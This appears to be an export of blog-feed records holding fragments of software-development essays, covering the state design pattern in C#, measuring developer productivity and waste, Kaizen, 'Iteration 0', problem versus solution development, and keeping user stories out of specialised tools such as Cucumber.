src=\"http://nathan.whiteboard-it.com/aggbug/12.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=HI9w8pOZ\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=fQg30eMT\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=7WMhTUYW\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/GtbT4ZHPKn8\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1048}}

class=\"rem\">// Pay the employee</span><br />}<br />}</pre>In this example, employees are compensated and promoted based upon their positions.  The domain object, Employee, delegates these actions to the AbstractEmploymentState object.<br /><br />Note how simplified the Promote and Compensate methods of Employee are:<br /><pre class=\"csharpcode\"><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Promote()<br />{<br />EmploymentState.Promote();<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting)<br />{<br />EmploymentState.Compensate(accounting);<br />}</pre>Adding a new state, or increasing the complexity of the logic involved in compensation and promotion of the Employees is encapsulated, leaving the design flexible.<br /><h3>Polymorphic Employee</h3>Ok, so polymorphism is good.  Every OO programmer knows that, right?  So why don't we just make the Employee class polymorphic with subclasses for each position i.e. JuniorDeveloper, SeniorDeveloper, and TechnicalLead are all classes that inherit from Employee and implement the appropriate Compensate and Promote logic.<br /><br />In this case, implementing the promote logic in the subclasses would be quite challenging as we can not change the type of a class at runtime.  It could be done by changing the Promote method signature to return an Employee.  The subclasses could then each implement Promote that returned an appropriate subclass of employee.  However, this solution feels contrived.  It is also more difficult to understand for a future maintenance programmer and could lead to hard to find bugs.<br /><br />Another reason we may not wish to have a polymoprhic Employee class is because there may be multiple state objects in a single domain object.  What if we need not only to compensate and promote employees based upon their position, but also to assign vacation days based upon the project to which the empoloyee is currently assigned?  A situation where we needed a class for TechnicalLeadWhoIsWorkingOnProjectX arises.<br /><br />Another reason to use the state pattern instead of full blown polymoprhism of the domain object is when using an ORM such as NHibernate.  NHibernate with Single Table Inheritance does not make it easy to change the type of a persistent object.  You can do with with SQL, but it's a clumbsy solution.<br /><h3>Conclusions</h3>The state pattern is a useful tool in a programmer's swiss army knife of design patterns.  It can help you avoid ugly switch statements and encapsulate domain logic in a flexible manner.<br /><br /><a

If you only ever measure your pace when doing value-added work, the results will be a massive over-statement of developer productivity.<br /><br />Complicating matters further, developers' natural pride in workmanship can make classifying work as \"non-value-added\" a difficult task. Without an environment that is entirely supportive of transparency, learning, and improving, truthful measurements of productivity are just not possible. Far too many personal preservation mechanisms will get in the way.<br /><br />The hard, cold truth about developer productivity is that a truthful measure of productivity on a typical software development team is in the 10% to 30% range. Getting a clear picture of the reality of software productivity on your team remains a necessary effort - even in light of the difficulties of undertaking it.<br /><br /><b>Non-Value-Added Work</b><br /><br />Pride in workmanship is what keeps most developers engaged in the work, but it's a double-edged sword. Peter Drucker's famous quote applies: \"There is nothing so useless as doing efficiently that which should not be done at all\".<div><br />We have to come to terms with non-value-added work. We have to<i>consent</i>to it. Non-value-added work simply<i>is</i>.</div><div><br /></div><div>If we're willing to consent to the reality of non-value-added work, then we'll be open to seeing it. Seeing it is the first step toward measuring productivity meaningfully, which is the first step to developing an action plan for restoring productivity.<br /><br />If you can get comfortable with the reality of non-value-added work, then you can get comfortable with using its proper name:<i>waste</i>.</div><div><br />Here are a few things that we do that are waste - regardless of any pride we might have in the hard work and perseverance involved:<br /><br /><ul><li>Teasing apart code to understand how it works, especially when this effort is repeated whenever a team member confronts that code</li><li>Performing deep and complex setups of data in an external system (or systems) in order to prove that changes to a local system are correct</li><li>Hiding distributed systems behind interfaces that pretend that remote objects are local objects</li><li>Failing to create transparency in objects' interfaces as to their underlying latency, or network and storage protocols</li><li>Creating development infrastructure, tools, or automation that is only readily-understood by people who have had extensive experience with them</li><li>Failing to properly codify or tag tests so that knowledge of which tests to run and how to run them when a change is made is obvious</li><li>Designing tests who's failures aren't definitive proof of either defacto functional errors or mistakes in setting up or operating up the test environment</li><li>Failing to recognize excess tests as coupling problems that obstruct needed design changes</li><li>Designing tests with either excess specificity, test granularity, or penetration into adjacent modules</li><li>Underestimating the destructiveness of ambiguity in any code or any other development artifact in general</li><li>amongst many other things that can appear as hard-won effort</li></ul><br />In short, any work you do that isn't directly related to adding desired capabilities to the system is waste. Any work that you do to resolve obstructions to getting your work done is waste - even if that work improves the overall quality of the system. The reason is simple: obstructions are mistakes that you haven't yet learned not to make.<br /><br />Some design challenges are due to unforeseen changes in direction in technology or business. As long as you can make those changes without also having to deal with negligent design choices and expediencies of the past, then you're still adding value. The moment you have to deal with obstructions to the work, you're incurring waste - no matter how attached you might be with the designs, mechanisms, and even human organizations and processes that underly the obstructions.<br /><br />There may always be some waste in the work, but the presence of it doesn't excuse an aversion to seeing it for what it is, accepting that it's there, consenting to its presence, and developing the means to aggressively and progressively eliminate it.<br /><br /><b>Measuring Productivity</b><br /><br />Here's how to get a clear, honest look at software development productivity:<br /><br />The moment you're forced to divert to non-value-added work, write down the time. The moment you're back on track doing value-added work, write down that time. At the end of the day, add up all the non-value-added time and subtract it from your total work time.<br /><br />Your work time shouldn't include things that aren't time spent on developer activities unless they're directly related to dealing with an obstruction. For example, a lunch break isn't non-value-added time. However, a walk to the break room to blow off the steam building up from dealing with frustrating design mistakes is counted as non-value-added time. A standup meeting isn't non-value-added time, but a meeting to address an obstruction or to resolve an ambiguity is non-value-added time.<br /><br />You'll inevitably come across grey areas where some time spent isn't easily classified as non-value-added or value-added. This is especially-true of explicit improvement efforts. Discussing these grey areas with your team and coming to some conclusion is a valuable part of the larger improvement journey that you're on.<div><br /></div><div>Make all the factors feeding your considerations explicit and come to the best decision you can for the circumstances you face. And most of all, understand that different circumstances might lead to different conclusions. Make these differences explicit as well. Open dialog and flexibility is an absolute must, but so is rigor. Keep an open mind (an open heart is also helpful), but be vigilant against allowing a discussion to become a zoo.<br /><br />If you do a daily standup or status meeting, or have an activity stream app like Campfire, an IRC channel, or even email, report on your productivity every day. Even if you're the only person on your team undertaking the exercise (note: this isn't really sustainable), you can report your productivity.<br /><br />The goal is to be transparent about the truth of your software development productivity. Once the truth is laid out for all to see, it has a chance of affecting the moment-by-moment decisions that you and your teammates make that continue to confound progress.<br /><br /><b>Next Steps</b><br /><br /><div>Wherever there's waste, there's an accumulation of excess complexity that encourages even more waste. The goal is to fix the design problems that cause it, and to restore productivity to sensible levels. And ultimately, to fix the processes that encourages the waste that exacerbates the design problems that take up long-term residence.</div><div><br /></div><div>We have to remain utterly unattached to the efforts we invest in solving problems that should not have existed in the first place. If we're not capable of adopting such a disposition, we're incapable of harvesting enough learning about counter-productivity to restore productivity.</div><div><br /></div></div><div>If you can measure your productivity truthfully, then you can work with your team to collectively improve the situation, and to continue to improve it.<br /><br />The start of an improvement effort begins with recognition of a problem and a pathology. Being able to make measurements of the problem is essential to recognizing the problem and also to monitor progress. By developing the ability to recognize waste, you've also given yourself some basic tools to monitor your progress. Measurement might be a bit depressing at first, but it also becomes encouraging as you make progress.<br /><br />The anatomy of an improvement effort is the subject for another day, but suffice to say that what you're trying to create is a Learning Culture. Doing this isn't a quick-fix, but undertaking it will yield some benefit immediately, and continue to yield a constant stream of value along the way.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p></div></div><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=3MVgvl0n5ng:Cnfm1E6f1_M:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=3MVgvl0n5ng:Cnfm1E6f1_M:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=3MVgvl0n5ng:Cnfm1E6f1_M:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/3MVgvl0n5ng\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1051}}

It loses its power in the translation.<br /><br />\"Continuous\" is perfectly reasonable and correct, but it doesn't really convey Kaizen as the underpinnings of a way doing work. Kaizen is certainly continuous, but it's continuous as a side effect. More importantly than being<em>continuous</em>, Kaizen is<strong><em>relentless</em></strong>.<br /><br />\"Continuous Improvement\" can become a flaccid thing - yet another empty corporate mission. At its worst, it reinforces workers' cynicism about cultural initiatives that don't really make work or outcomes any better. \"Continuous Improvement\" is passive. It's even apologetic and deferential. \"Relentless Improvement\" is active. It's even fair to say that Kaizen is<em>aggressive</em>.<br /><br />Often, the real problems robbing an organization of its productivity are the smaller, pervasive problems that are finely-woven into the fabric of the way that work is done and conceptualized. When you solve problems that are inherent in the DNA of the work (and consequently, the organization), you'll likely free up more resources than you might have imagined. A<em>Kaizen culture</em>understands that microscopic, pervasive rot causes a kind of osteoporosis in the bones of the work that can't be seen without actively hunting it with fine optics, or until the bones start to break.<br /><br />A Kaizen culture doesn't wait for problems to show up. It looks for problems. It's imbued with an awareness that<em>negligible</em>problems often aren't negligible at all - especially when they're pathological and pervasive. It knows that pathological and pervasive problems are often charged with the greatest potential for destruction. Kaizen is literally \"looking for trouble\", knowing that if it doesn't, trouble will find it. It challenges its belief that these<em>negligible</em>problems are not worth effort or attention. It grounds its exploration in meaningful but practicable, and accessible<a href=\"http://en.wikipedia.org/wiki/PDCA\">measurements</a>, rather than in methodology mysticism. In progressively learning what measurements are interesting and practical, it learns to ask better questions.<br /><br />When a Kaizen culture doesn't see problems, it wonders first whether its vision needs improvement, and sets out to sharpen its eyes rather than rest on its laurels and dull its senses. The adage, \"If it ain't broke, don't fix it\", is a fallacy. Waiting for problems to come to you means that you're dancing to their tune. The downward, entropic cycle of fire-fighting and decay isn't transformed into a greater capacity to keep moving forward without constantly losing ground.<br /><br />In the end, \"Continuous Improvement\" is useful because it's a standard term. But when it's time to actually<em>do</em>Kaizen, \"Relentless Improvement\" sets more realistic expectations about how it achieves pervasive dominance over pervasive problems.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=JqSKKCX7Tts:SkzepMGr4C8:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=JqSKKCX7Tts:SkzepMGr4C8:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=JqSKKCX7Tts:SkzepMGr4C8:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/JqSKKCX7Tts\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1052}}

It's often also a time to configure individual workstations and team members' tools in preparation for everyone starting work.<br /><br />\"Iteration 0\" is a bit of a popular misconception that is a side-effect of software projects initiated by technologists - which sounds a bit ridiculous at first. After all, who else but technologists to do software projects? Of course technologists are the right people to do software projects, but are all technologists the right people to execute project startup? And for that matter, what is \"project startup\" as differentiated from the rest of the work? Is it something that should be approached differently than the rest of the work?<br /><br />The technology-focused project initiation isn't necessarily the wrong thing to do, but it's often only the right thing to do from within the technologist's perspective, and that perspective can be limited. A tool-biased perspective is a challenging thing to overcome by someone whose moment-by-moment work is necessarily suffused with a constant focus on tools, or whose initial career path passes through a lengthy time of tool focus.<br /><br />If we literally codify the \"first iteration\" as \"Iteration 1\", we technologists can use a bit of geekery to make allowances for a<span style=\"font-style:italic;\">pre-iteration</span>focused on technology. As programmers, we're accustomed to counting a list of things starting from zero. If the list of iterations starts at the \"zeroeth\" position, but work is only scheduled to start on the first position, then we get an extra \"unclaimed\" iteration to work with: \"Iteration 0\".<br /><br />Any way you cut it, the first iteration is the first iteration, regardless of the numerical designation assigned to it - and regardless of creative license and word games. If you choose to have a zero-based project schedule, then we should naturally change the schedule to state, \"Deliver something user-valued in Iteration 0\". Which, consequently, is not an invitation to technologists to insert an \"Iteration -1\" at the head of the schedule.<br /><br />Over the past few years the caution to not exit any iteration having only shipped technology has been whittled down to a more technologist-friendly caution against exiting an iteration having only shipped<span style=\"font-style:italic;\">frameworks</span>. It's a narrower interpretation of a deeply-powerful principle. It sets the stage for the institution of a technology-focused \"Iteration 0\".<br /><br />Nonetheless, it's sometimes necessary to devote a period of work entirely to technology concerns - especially if technology concerns become obstructions to user-valued concerns. And it's all too easy for technology to become an obstruction to delivery in a technology product delivery effort. But this isn't the problem with \"Iteration 0\".<br /><br />\"Iteration 0\" is a project startup issue that is technology-focused startup rather than a product-focused project startup. There's an implicit assumption in \"Iteration 0\" that - while perfectly reasonable from a technologist's perspective - isn't necessarily an optimal path for project startup.<br /><br />If a project startup is executed with \"all hands on deck\", then coordination of the people involved becomes an issue that must be dealt with right of the bat, including the setup of tools that support the coordination.<br /><br />So, is it necessary to start a project with an amount of people that necessitates coordination and collaboration<span style=\"font-style:italic;\">tools</span>? If project startup is executed with a small workcell of skilled pathfinders, do they need the tools that necessitate the \"Iteration 0\" work?

Business Analysts and Product Owners can be wrong. They can be the best representatives of user interests but they're often still<span style=\"font-style:italic;\">proxy</span>users. The most expensive mistakes to be made in software product development are made when we get the requirements wrong. A quick way to increases the risk of proceeding to solution development on the basis of incorrect requirements is to not prove that they're right. Or, in other words, to not<span style=\"font-style:italic;\">test</span>them.<br /><br />The only way to<span style=\"font-style:italic;\">definitively</span>validate that the problem statements for a software product are right is to put the working software in users' hands.<br /><br />User interviews, focus groups, simulations, and mockups are steps along the way, but their purpose is to reduce the time and cost of getting users in front of an experience that is immersive enough to validate assumptions. Allowing users to experience our proposed solutions to their problems clarifies whether the problem is understood.<br /><br />Generally, we're taking too long to get stories validated - even in colloquial Agile development. Sending a user story through an entire development process in order to validate it is too much. In order to validate user stories, we need to collapse the solution development timeline so that feedback can be had without the expense of the solution development. We commit to the solution development cost once we've validated the problem.<br /><br />There are two distinct (but inextricably-intertwined) steps that make up a development process that recognizes the value of reducing the time-to-feedback for testing user stories. The later step is the plain-old<span style=\"font-style:italic;\">Solution Development</span>that we use regardless of whether we recognize a preliminary first step. The earlier step is<span style=\"font-style:italic;\">Problem Development</span>.<br /><br />Problem Development is software development. There's code. There's deployment. There's testing. There's design and analysis. There's process. There's just much more of it in Solution Development (even Agile development) than in Problem Development. And there are different kinds and variations of these activities in each. Problem Development is software development that works hand-in-hand with business development.<br /><br />Problem Development and Solution Development have different goals. Problem Development is concerned with feeding Solution Development with input that has less risk (at a time when risk is the riskiest).<br /><br />Assumptions are liabilities. User stories are assumptions until they're validated. To validate user stories, deliver software experiences that propose to solve the problems that user stories describe, and measure the feedback. There's<span style=\"font-style:italic;\">delivery</span>in Problem Development, but not<span style=\"font-style:italic;\">final delivery</span>.<br /><br />Final delivery is a concern of Solution Development. Final delivery requires<span style=\"font-style:italic;\">long-term sustainability</span>. Solution Development is concerned with long-term sustainability. When we work toward achieving long-term sustainability before we need it, we end waiting until the longer Solution Development process plays out before getting feedback on user story validity. Which is too long.<br /><br />Problem Development is concerned with<span style=\"font-style:italic;\">short-term sustainability</span>. The reason that it has to be sustainable at all is that the output of Problem Development is the input to Solution Development, and these two steps are ultimately one process that flows together.<br /><br />It's far too easy to see Problem Development as \"throw-away coding\", but it's absolutely not. Problem Development is a way to manage some of the biggest risks in software development - risks that often go un-addressed and are frequently realized as wasted effort and resources, and lower productivity. This kind of risk isn't effectively managed with practices that are satisfied by \"throw-away\" code.<br /><br />If throw-away code is the output of Problem Development, then Solution Development has to undergo a (mostly) cold start, benefiting from far less of the momentum created by Problem Development. It might be necessary to make the kind of tradeoff that creates these kinds of<span style=\"font-style:italic;\">batch transfer</span>problems, but making a habit of it is a path to a cumulative productivity deficit.<br /><br />The kinds of practices that characterize Problem Development might look like software development heresy (or at least \"Agile\" heresy) to many disciplined solution developers. The realities of Problem Development mean that traditional aspects of Solution Development are short-circuited - after all, Problem Development is looking for a shorter circuit.<br /><br />The Problem Development practices might even seem irresponsible, but recognize whether you're looking through a Solution Development lens. For just as Problem Development practices can seem irresponsible from a Solution Development perspective, applying Solution Development practices to the point in the timeline best suited to Problem Development can be equally as irresponsible.<br /><br />Problem Development is about testing or<span style=\"font-style:italic;\">validating</span>user stories' problem statements. Solution Development is about building software based on validated problem statements.<br /><br />The whole of development process is concerned with finding the<a href=\"http://leastway.org\" target=\"_blank\">way with the least</a>wasted effort in getting from<a href=\"http://www.amazon.com/Implementing-Lean-Software-Development-Concept/dp/0321437381\" target=\"_blank\">concept to cash</a>.<br /><br />Feeding un-validated user stories into the Solution Development transformer is often the most efficient way to increase wasted effort.<br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=1F2Tc2YDnUg:PIka4NTP1_c:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=1F2Tc2YDnUg:PIka4NTP1_c:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=1F2Tc2YDnUg:PIka4NTP1_c:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/1F2Tc2YDnUg\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1054}}

And they're visible all the time. When individuals or individual specializations involved presume a sense of \"ownership\" over user stories, doing Agile development well becomes difficult if not entirely impossible, save for a veneer of \"Agile Theater\".<br /><br />As user stories flow through the whole development process from conception to delivery, they pass through the hands of a number of job functions and workers. Any time that people working in the vicinity of a given work step are given to believe that they \"own\" the user story in their current purview, they are likely to displace the user story from the most public and most visible medium that is common to the whole team. User stories are often then removed to the bowels of tools that are practical and accessible only to workers at the current work step and its immediate vicinity.<br /><br />User stories can, do, and should change as they march forward through elaboration from concept to working product. Product development is a process of constantly unearthing a clearer understanding of the work we're doing while we're doing it. No amount of up-front analysis and design can stop this from happening. It's the nature of the kind of work that software development is, ie: product development.<br /><br />If software development were manufacturing work, we'd know what would be happening in each step of the process before it happened. But then, we'd have to be creating exactly the same product again and again, which would be nothing short of an absurdity for software development.<br /><br />The further we get into the process of turning an idea into concrete, material product, the greater the clarity and amount of thinking that gets invested into what we're doing. The more thinking invested, the more that we come to understand the subject matter we're working with, the circumstances of product's intended audience, and the fit of the decisions we've made earlier in the process to the reality waiting at the end of the process when real workers will try to do real work with the delivered product.<br /><br />Analysis and design are present in absolutely every kind of work done in software development, and present in every stage and every work step. And while we may indeed have work steps early in software development processes that appear to be characterized by work exclusively in analysis and design, this is ultimately a consequence of not having concrete product yet in-hand at those early stages.<br /><br />These early stages are less \"Analysis and Design\" stages as they are \"Absence of Material Product\" stages. We resort to seeing early stages as \"Analysis and Design\" due more to a habit of human perception that tends to draw attention to things that are present than to things that are absent. But later stages are no less \"Analysis and Design\" stages as a \"Testing\" stage in any less of a \"Development\" stage.<br /><br />It's the same cognitive wrinkle that makes<span style=\"font-style: italic;\">negative space</span>visualizations like<a href=\"http://en.wikipedia.org/wiki/Rubin_vase\">Rubin's Vase</a>or the<a href=\"http://www.google.com/images?um=1&hl=en&safe=off&rlz=1B5_____enUS335US335&biw=935&bih=503&tbs=isch%3A1&sa=1&q=fedex+logo&aq=f&aqi=&aql=&oq=&gs_rfai=\">FedEx logo</a>so compelling when we finally recognize the secondary images conveyed by the space that our cognitive facilities filter out. It's also what keeps us from being in a constant state of anxiety due to cognitive overload, and what allows us to be mindful of predators (not to mention to be unmindful of camouflage).<br /><br />The kinds of work we do in software product development are rarely unique to any given stage. The kinds of work we do accumulates continuously so that later stages have responsibilities for nearly all of the kinds of work done in software development throughout the entire process. That's not to say that front-loading software development work with conceptual work is a bad idea. It's obviously an essential part of doing product development work successfully. But it's easy to mistake early-stage work as the domain of \"analysis and design\" due to the absence of material product this early in the game. The absence of material product at early stages should be a conspicuous absence, but the conspicuousness is typically lost to cognitive filters.<br /><br />The disastrous side effect of failing to recognize this<span style=\"font-style: italic;\">negative space perspective</span>is the mistaken conclusion that analysis and design is the sole domain of early-stage work. And it starts the people involved in software work on the slippery slope toward believing that work on requirements analysis only happens early in the process, and that requirements - once defined - will not have to change. As if we could really know anything so conclusive so early in the process of uncovering clarity and understanding.<br /><br />In the end, early stage work is naturally limited in that it can usually only be conceptual work. Conceptual work is realistically the only work that<span style=\"font-style: italic;\">can</span>be done so early. While the accumulation of responsibilities at work steps later in the process continues, analysis and design never wane. New clarity and new understanding never subsides. In fact, clarity and understanding only get sharper. This continues even once a software product has been made operational.<br /><br />Because understanding continues to get sharper the further along we are, any concrete record of our understanding must be kept up-to-date to make sure that our collective clarity remains collective. Otherwise, workers at different stages of the whole process will have different understandings of what the goal is - as currently defined by all recent learning.<br /><br />Making sure that everyone is on the same page is of paramount importance in any development effort. Locking down the definition of what's needed isn't the way to do this - although it's often the mistaken path that software organizations take when they fail to recognize the cumulative nature of understanding and clarity as product development unfolds.<br /><br />To keep everyone on the same page, user stories must be accessible to everyone involved in a development effort, from early-stage conceptual work, all the way through delivery when placeholders like user stories are replaced with concrete, material product. They must be accessible with the least amount of effort by all people involved and at all stages and work steps.<br /><br />At any point in the whole process, anyone who is empowered to add user stories, change existing ones, remove user stories, or otherwise make use of them should not have to go through a worker with specialized tool skills due to user stories having been removed to a tool that is not generally-accessible with an absolute minimum of effort and a maximum of immediacy.<br /><br />Stated as a general principle: No single work group at any work step should remove user stories to a medium that, while more expedient to their work, causes user stories to become less accessible by others with different skills and responsibilities.<br /><br />The inevitable result of workers at a work step feeling that user stories can be removed to a more<a href=\"http://en.wikipedia.org/wiki/Local_optimum\">locally-optimized</a>medium is that separate copies of a user story will be used by workers at different work steps, and these copies will inevitably diverge. When multiple copies of the same user story diverge, workers at different work steps have different understandings of expectations and goals, and work at cross purposes.<br /><br />In the worst of these situations, workers at different work steps aren't even aware of the others' divergent versions of the truth, and labor under the resulting conflict without any idea as to why expectations are consistently not being met. This drives up rework, reduces the credibility of the team, increases stress and conflict on the team, and generally leads back to the chaos that Agile development was supposed to address.<br /><br />And yet, there are indeed advantages to specialized tools for specialized work steps. Great care should be taken though when considering specialized tools for artifacts that aren't specialized. It's often a mistake and an oversight when specialized tools are put in place at a work step that makes collective artifacts less accessible for the duration of the work step, or from that work step onward. In the case of user stories, it's hard to find a single artifact that is more collective, public property and thus less amenable to workstep-specialized tools.<br /><br />At every stage of development, workers can back-slide into misconceptions of authority over artifacts that are responsible for unifying the whole effort and for stitching diverse workflows and workers together. The further we get into a software process, the more likely it is that workers at a later stage will remove user stories from more generally-accessible media and sequester them into the bowels of tools that are accessible only to people with specialized skills.<br /><br />For example, consider the<a href=\"http://cukes.info/\">Cucumber framework and tools</a>developed in the Ruby community, and the family of derivatives and clones that have since been created in a host of programming languages.<br /><br />This style of tool encourages the displacement of user stories from more generally-accessible media into programmer-specific media. It doesn't do so accidentally. It's done as a recommended practice - reinforced by articles, books, and software conference presentations and workshops.<br /><br />While Cucumber is built on some fairly compelling technology, and is itself an impressive work, it's not exactly methodologically-sound in that it fails to recognize its own contradiction of Agile development's core value of<a href=\"http://agilemanifesto.org/\"><span style=\"font-style: italic;\">individuals and interactions over processes and tools</span></a>.<br /><br />As an aside, I brought up this issue with Aslak Hellesøy, the Principal of the Cucumber project, during a trip to Sweden last year. At the time, he informed me that work was being done on a tool to extract user stories from the specialized media to make them generally-accessible. But there are three non-trivial oversights inherent with this solution:<br /><br />Firstly, it disregards the a-priory value of whole-team organizational methodologies like Agile by allowing collective and communal artifacts that are fundamental to higher-order productivity to become appropriated by one specialization.<br /><br />Secondly, it seeks to address a problem that exists because of overly-elaborate tooling by creating even more elaborate tooling. The path back to simplicity and clarity - i.e.: \"elegance\" - likely also suggests removing the first wave of tooling rather than adding a second wave of compensating tooling. There are presently solutions that are arguably more holistically-effective as well as arguably more simple and clear. Although, they're based on less elaborate programming technology, and this is likely why the programming specialization remains distracted for alternatives.<br /><br />Thirdly, it doesn't address the need to allow user stories to be added, removed, combined, divided, or changed by anyone with the authority to do so regardless of whether he or she is comfortable with tools, approaches, and perspectives that are more natural to the programmer specialization.<br /><br />A Cucumber-style tool can be justified arguably as a general tool because it serves the whole of the process with testing and specification, but merely serving the whole of the process doesn't atone for the reduction in accessibility and immediacy of collective artifacts.<br /><br />To Aslak's credit, he demonstrated a way of using Cucumber to me where user stories are not removed to its media. Nonetheless, removing user stories to Cucumber media continues to be a practice that is perpetuated in the user community remains a non-trivial methodological problem that is likely rooted in the narrowing of focus of specialized workers due to impressive tooling.<br /><br />NOTE: There are more 